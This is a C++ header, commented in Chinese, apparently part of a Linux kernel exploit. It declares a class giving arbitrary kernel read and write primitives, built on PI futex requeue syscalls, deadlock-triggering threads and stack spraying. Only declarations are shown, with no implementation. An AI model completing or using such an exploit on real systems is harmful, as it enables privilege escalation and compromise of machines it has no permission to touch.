#pragma once
#include <condition_variable>
#include <mutex>
#include <thread>
#include <vector>
//读写原语类
class Prim {
public:
    static Prim& getInstance() {
        static Prim instance;
        return instance;
    }
    Prim(const Prim&) = delete;
    Prim& operator=(const Prim&) = delete;
    Prim(Prim&&) = delete;
    Prim& operator=(Prim&&) = delete;
    //读写原语
    //调用者需确保 *addr 前8(layout=0)/8-16字节(layout=1)可写，否则崩溃
    void read_link(unsigned long addr, std::vector<unsigned long> &data, unsigned long n, int layout);
    //调用者需确保 *val 前8(layout=0)/8-16字节(layout=1)可写，否则崩溃
    void write_link(unsigned long addr, unsigned long val, int layout);
private:
    //触发死锁和消费的3线程
    void waiter();
    void owner();
    void consumer();
    long w_tid = 0;
    std::thread w, o;
    int f_wait = 0, f_chain = 0, f_target = 0;//PI futex
    std::atomic<bool> w_owns_chain{}, o_owns_target{};

    std::mutex rw_mtx{};//读写原语必须是原子操作
    int delay_us = 0; // 涂完栈等多久消费
    unsigned long addr_last_read = 0, layout_last_read = -1; //上次读的地址和布局
    void check_addr(int layout);

    //涂栈和析构通知
    std::condition_variable cv{};
    bool place_stack{}, cleanup{};
    std::mutex cv_mtx{};
    //无锁写原语，给read_p用
    void write_link_no_lock(unsigned long addr, unsigned long val, int layout);
    //用户态接口的原始内存转储，n单位是8字节
    std::vector<unsigned long> get_api(unsigned long n);

    Prim();
    ~Prim();
    //系统调用
    long lock_pi(int *uaddr);
    long unlock_pi(int *uaddr);
    long wait_requeue_pi(int *uaddr, int *uaddr2);
    long cmp_requeue_pi(int *uaddr, int *uaddr2, int cmpval);
    long sched_setattr_batch(long tid);
};
